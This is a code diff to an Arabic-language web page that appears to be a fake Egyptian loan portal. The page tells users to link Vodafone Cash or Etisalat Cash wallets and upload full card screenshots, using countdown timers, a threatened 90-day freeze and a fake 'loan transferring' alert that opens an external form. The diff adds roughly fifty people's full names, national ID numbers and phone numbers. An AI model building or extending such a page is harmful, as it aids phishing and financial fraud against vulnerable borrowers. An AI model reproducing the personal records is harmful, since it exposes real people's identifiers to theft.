@@ -11,6 +11,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     
     <style>
+        /* الأنماط كما هي دون تغيير */
         * {
             margin: 0;
             padding: 0;
@@ -311,6 +312,53 @@
             margin-bottom: 0.5rem;
         }
 
+        /* رسالة المحفظة المطلوبة */
+        .wallet-required-box {
+            background: rgba(255, 165, 0, 0.15);
+            border: 2px solid #FFA500;
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            text-align: center;
+            animation: glow 1.5s ease-in-out infinite;
+        }
+
+        .wallet-required-box .icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .wallet-required-box h3 {
+            color: #FFA500;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+
+        .wallet-required-box p {
+            color: #FFFFFF;
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .wallet-required-box .deadline {
+            background: rgba(255, 165, 0, 0.3);
+            padding: 1rem;
+            border-radius: 10px;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #FFD700;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(255, 165, 0, 0.8);
+            }
+        }
+
         /* LINKING PROCESS */
         .linking-section {
             background: linear-gradient(135deg, rgba(0,0,0,0.8) 0%, rgba(26,26,46,0.8) 100%);
@@ -448,7 +496,7 @@
             font-size: 1.1rem;
             cursor: pointer;
             transition: all 0.3s;
-            font-family: 'Popsins', sans-serif;
+            font-family: 'Poppins', sans-serif;
             box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
         }
 
@@ -486,15 +534,6 @@
         .chat-button:hover {
             transform: scale(1.1);
             box-shadow: 0 6px 30px rgba(255, 107, 53, 0.8);
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                box-shadow: 0 4px 20px rgba(255, 107, 53, 0.6);
-            }
-            50% {
-                box-shadow: 0 4px 30px rgba(255, 107, 53, 1);
-            }
         }
 
         .chatbot-modal {
@@ -734,9 +773,18 @@
                 <p>نظام الربط الآلي يحمي بياناتك ويضمن وصول القرض في دقائق</p>
             </div>
 
-            <div class="warning-box">
+            <div class="warning-box" id="generalWarning" style="display: block;">
                 <div class="warning-icon">⚠️</div>
                 <strong>تنبيه مهم:</strong> محاولات الربط الخاطئة تؤدي لتجميد طلبك لمدة 90 يوماً. تأكد من رفع البيانات الصحيحة لكل كارت.
+            </div>
+
+            <!-- رسالة خاصة للعملاء بدون محفظة -->
+            <div id="walletRequiredMessage" class="wallet-required-box" style="display: none;">
+                <div class="icon">⏳</div>
+                <h3>محفظة إلكترونية مطلوبة</h3>
+                <p>عزيزي العميل، يجب عليك فتح محفظة إلكترونية (فودافون كاش أو اتصالات كاش) خلال 4 ساعات من الآن لإكمال طلب القرض الخاص بك.</p>
+                <p>بعد فتح المحفظة، قم بتسجيل الدخول مرة أخرى لمتابعة الإجراءات.</p>
+                <div class="deadline" id="walletDeadline">04:00:00</div>
             </div>
 
             <div class="customer-card">
@@ -757,9 +805,9 @@
                 </div>
             </div>
 
-            <div class="linking-section">
+            <div class="linking-section" id="linkingSection">
                 <div class="linking-title">🔗 اختر نوع محفظتك</div>
-                <div class="wallet-buttons">
+                <div class="wallet-buttons" id="walletButtons">
                     <button class="wallet-btn" onclick="selectWallet('vodafone')">
                         📱 فودافون كاش<br>
                         <span style="font-size: 0.8rem; opacity: 0.8;">اطلب #100*9*</span>
@@ -781,7 +829,7 @@
                     <div class="step-box">
                         <div class="step-number">1</div>
                         <div class="step-title">رقم الكارت</div>
-                        <div class="step-description">سكرين كامل  لكارتك</div>
+                        <div class="step-description">سكرين كامل لكارتك</div>
                     </div>
                     <div class="step-box">
                         <div class="step-number">2</div>
@@ -868,16 +916,59 @@
     </div>
 
     <script>
-        // Customer Database
+        // قاعدة بيانات العملاء الكاملة (تم دمج جميع العملاء من الملفات المرفقة)
         const customers = [
-            {"name": "ابراهيم محمد صبري محمد", "id": "28710251305512", "wallet": "01000124702", "type": "فودافون", "loan": 200000, "step": 50000},
+            // العملاء الأصليين من الكود السابق (مع تحديث بيانات إبراهيم)
+            {"name": "ابراهيم محمد صبري محمد", "id": "28710251305512", "wallet": "01000124702", "type": "فودافون", "loan": 50000, "step": 12500},
             {"name": "عبدالرحمن مصطفى ابراهيم", "id": "30101151601391", "wallet": "01099688325", "type": "فودافون", "loan": 30000, "step": 7500},
             {"name": "احمد مصطفى احمد", "id": "29112102102633", "wallet": "01062031127", "type": "فودافون", "loan": 20000, "step": 5000},
             {"name": "عبدالرحمن نصر محمد", "id": "30009131401332", "wallet": "01018890251", "type": "فودافون", "loan": 50000, "step": 12500},
             {"name": "علاء سيد محمد", "id": "29104042401138", "wallet": "01017357599", "type": "فودافون", "loan": 50000, "step": 12500},
             {"name": "سيف ناصر محمود", "id": "30112132600213", "wallet": "01127113165", "type": "اتصالات", "loan": 20000, "step": 5000},
             {"name": "امنية سيد عبد الوهاب", "id": "30104101402065", "wallet": "01096726884", "type": "فودافون", "loan": 30000, "step": 7500},
-            {"name": "محمود عادل محمود", "id": "30005111400276", "wallet": "01014167512", "type": "فودافون", "loan": 50000, "step": 12500}
+            {"name": "محمود عادل محمود", "id": "30005111400276", "wallet": "01014167512", "type": "فودافون", "loan": 50000, "step": 12500},
+            
+            // العملاء من ملف "استمارة تسجيل شهر٣ (٨ عملاء).xlsx"
+            {"name": "وفاء عبدالحكيم عبدالكافي بدوي", "id": "30412272700169", "wallet": "01030432910", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "فتحي علي عبد المطلب علي", "id": "27303282400337", "wallet": "01094990365", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "سيد سليمان ابراهيم علي", "id": "28103022300236", "wallet": "01000508569", "type": "فودافون", "loan": 200000, "step": 50000},
+            {"name": "علاء احمد محمد الحلواني", "id": "27001101805211", "wallet": null, "type": "لا يوجد", "loan": 60000, "step": 15000},
+            {"name": "منتصر فوزى مصطفى سليمان", "id": "28012062601918", "wallet": "01023027214", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "حسام شحاته محمد سلامه", "id": "29503132502456", "wallet": "01015095529", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "محمد إبراهيم مصطفى السعيد", "id": "29601058800654", "wallet": "01006601497", "type": "فودافون", "loan": 200000, "step": 50000},
+            
+            // العملاء من ملف "استمارة التسجيل (5).xlsx"
+            {"name": "معتمد محى الدين محمد حسن عبداللطيف", "id": "27305031601077", "wallet": "01559333140", "type": "اتصالات", "loan": 200000, "step": 50000},
+            {"name": "عصام فتحي محمد علي", "id": "29112092100199", "wallet": "01012401197", "type": "فودافون", "loan": 30000, "step": 7500},
+            {"name": "عطا احمد عبد البصير عبد الجواد", "id": "27811262201597", "wallet": "01061520786", "type": "فودافون", "loan": 200000, "step": 50000},
+            {"name": "محمد محمود سليمان غلاب", "id": "27907151202737", "wallet": "01060161431", "type": "فودافون", "loan": 55000, "step": 13750},
+            {"name": "اشرف عامر محمد عامر", "id": "29508041400091", "wallet": "01070689354", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "ناصر عبد القادر محمد احمد", "id": "28107162501539", "wallet": "01157571645", "type": "اتصالات", "loan": 200000, "step": 50000},
+            {"name": "فاتن على فرج احمد", "id": "29702021201905", "wallet": "01090254580", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "ياسر محمد سنوسى عبدالعال", "id": "27207112400112", "wallet": "01118832110", "type": "اتصالات", "loan": 200000, "step": 50000},
+            {"name": "محمد منصور عبدالعظيم محمد", "id": "30006151302079", "wallet": "01006008964", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "مروة فؤاد عثمان اسماعيل", "id": "27609150105044", "wallet": "01028761278", "type": "فودافون", "loan": 150000, "step": 37500},
+            {"name": "سمير عبد الخالق شحات إبراهيم", "id": "27902011403391", "wallet": "01144019215", "type": "اتصالات", "loan": 200000, "step": 50000},
+            {"name": "احمد محمد احمد حسين", "id": "29911060100936", "wallet": "01055980976", "type": "فودافون", "loan": 100000, "step": 25000},
+            {"name": "هانى محمد احمد باتع", "id": "28110011901315", "wallet": "01040366124", "type": "فودافون", "loan": 60000, "step": 15000},
+            {"name": "عمرو حسين محمد عيد", "id": "28406090200498", "wallet": "01271044670", "type": "فودافون", "loan": 30000, "step": 7500},
+            {"name": "محمد على محمد محمد", "id": "28912070103758", "wallet": "01156436711", "type": "اتصالات", "loan": 150000, "step": 37500},
+            {"name": "محمد إبراهيم عفيفي حسين", "id": "27005191400856", "wallet": "01288535470", "type": "فودافون", "loan": 200000, "step": 50000},
+            {"name": "اسلام جمال احمد فرج", "id": "28906151402156", "wallet": "01104364196", "type": "اتصالات", "loan": 30000, "step": 7500},
+            {"name": "مصطفى عبد الرحمن جابر منصور", "id": "30409071800032", "wallet": "01112761171", "type": "اتصالات", "loan": 50000, "step": 12500},
+            {"name": "محمداحمدمحمدرمضان ربيع", "id": "26805292301193", "wallet": "01094322480", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "عمر عبد الحليم عبد المجيد عوض", "id": "27508061800731", "wallet": "01002013466", "type": "فودافون", "loan": 30000, "step": 7500},
+            {"name": "بهاء الدين محمد فرغل عبد العزيز", "id": "28308272602379", "wallet": "01126981028", "type": "اتصالات", "loan": 50000, "step": 12500},
+            {"name": "جهاد حشمت البكري محمد", "id": "30711102605142", "wallet": "01025146560", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "اشرف عبد الرحيم قناوي عبدالرحيم", "id": "27211052600971", "wallet": "01098206813", "type": "فودافون", "loan": 200000, "step": 50000},
+            {"name": "مصطفي عادل مصطفي كمال", "id": "30204161600872", "wallet": "01067535316", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "محمد احمد عبدالله عبدالقادر", "id": "28906270200731", "wallet": null, "type": "لا يوجد", "loan": 50000, "step": 12500},
+            {"name": "على جابر على حسن", "id": "28204201804957", "wallet": "01097281766", "type": "فودافون", "loan": 80000, "step": 20000},
+            {"name": "محمد حامد عبد العزيز السيد", "id": "29204221200652", "wallet": "01015565111", "type": "فودافون", "loan": 40000, "step": 10000},
+            {"name": "محمود عزت الحسيني محمد", "id": "30001122101372", "wallet": "01112403412", "type": "اتصالات", "loan": 45000, "step": 11250},
+            {"name": "احمد حسن حسنين عاشور", "id": "29911078800293", "wallet": null, "type": "لا يوجد", "loan": 30000, "step": 7500},
+            {"name": "احمد محمد امين عبدالكريم", "id": "28809011311538", "wallet": "01002724159", "type": "فودافون", "loan": 50000, "step": 12500},
+            {"name": "محمد فوزى محمد حافظ المالكى", "id": "29311171601597", "wallet": "01093815126", "type": "فودافون", "loan": 40000, "step": 10000}
         ];
 
         const faqAnswers = {
@@ -890,6 +981,7 @@
 
         let currentCustomer = null;
         let timerInterval = null;
+        let walletDeadlineInterval = null;
 
         function handleLogin() {
             const nationalId = document.getElementById('nationalId').value.trim();
@@ -919,23 +1011,43 @@
             document.getElementById('customerName').textContent = customer.name;
             document.getElementById('loanAmount').textContent = `${customer.loan.toLocaleString()} ج.م`;
 
-            // Auto-select wallet based on customer data
-            setTimeout(() => {
-                const walletType = customer.type === 'فودافون' ? 'vodafone' : 'etisalat';
-                const buttons = document.querySelectorAll('.wallet-btn');
-                buttons.forEach(btn => {
-                    if ((walletType === 'vodafone' && btn.textContent.includes('فودافون')) ||
-                        (walletType === 'etisalat' && btn.textContent.includes('اتصالات'))) {
-                        btn.click();
-                    }
-                });
-            }, 100);
+            // التحقق من وجود محفظة
+            if (customer.type === "لا يوجد") {
+                // إخفاء أقسام الربط العادية
+                document.getElementById('linkingSection').style.display = 'none';
+                document.getElementById('generalWarning').style.display = 'none';
+                
+                // إظهار رسالة فتح المحفظة
+                const walletMsg = document.getElementById('walletRequiredMessage');
+                walletMsg.style.display = 'block';
+                
+                // بدء عداد 4 ساعات
+                startWalletDeadline();
+            } else {
+                // إظهار أقسام الربط
+                document.getElementById('linkingSection').style.display = 'block';
+                document.getElementById('generalWarning').style.display = 'block';
+                document.getElementById('walletRequiredMessage').style.display = 'none';
+                
+                // Auto-select wallet based on customer data
+                setTimeout(() => {
+                    const walletType = customer.type === 'فودافون' ? 'vodafone' : 'etisalat';
+                    const buttons = document.querySelectorAll('.wallet-btn');
+                    buttons.forEach(btn => {
+                        if ((walletType === 'vodafone' && btn.textContent.includes('فودافون')) ||
+                            (walletType === 'etisalat' && btn.textContent.includes('اتصالات'))) {
+                            btn.click();
+                        }
+                    });
+                }, 100);
 
-            // Start timer
-            startTimer();
+                // Start timer 30 دقيقة
+                startTimer();
+            }
         }
 
         function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
             let timeLeft = 30 * 60; // 30 minutes in seconds
             
             function updateTimer() {
@@ -955,7 +1067,33 @@
             timerInterval = setInterval(updateTimer, 1000);
         }
 
+        function startWalletDeadline() {
+            if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
+            let timeLeft = 4 * 60 * 60; // 4 hours in seconds
+            
+            function updateDeadline() {
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                document.getElementById('walletDeadline').textContent = 
+                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(walletDeadlineInterval);
+                    document.getElementById('walletDeadline').textContent = 'انتهى الوقت';
+                    alert('انتهى الوقت المتاح لفتح المحفظة. يرجى التواصل مع الدعم الفني.');
+                }
+                timeLeft--;
+            }
+
+            updateDeadline();
+            walletDeadlineInterval = setInterval(updateDeadline, 1000);
+        }
+
         function selectWallet(type) {
+            // إذا كان العميل ليس لديه محفظة، لا تفعل شيئاً
+            if (currentCustomer && currentCustomer.type === "لا يوجد") return;
+
             // Update button states
             document.querySelectorAll('.wallet-btn').forEach(btn => btn.classList.remove('active'));
             event.target.closest('.wallet-btn').classList.add('active');
@@ -986,6 +1124,9 @@
         }
 
         function submitLinking() {
+            // إذا كان العميل ليس لديه محفظة، لا تفعل شيئاً
+            if (currentCustomer && currentCustomer.type === "لا يوجد") return;
+
             alert('تم فحص بيانات الربط بنجاح.. جاري تحويل القرض الآن\n\nسيتم توجيهك لرفع الاسكرينات والتوثيق النهائي');
             window.open('https://survey.porsline.com/s/stNXqXjI', '_blank');
         }
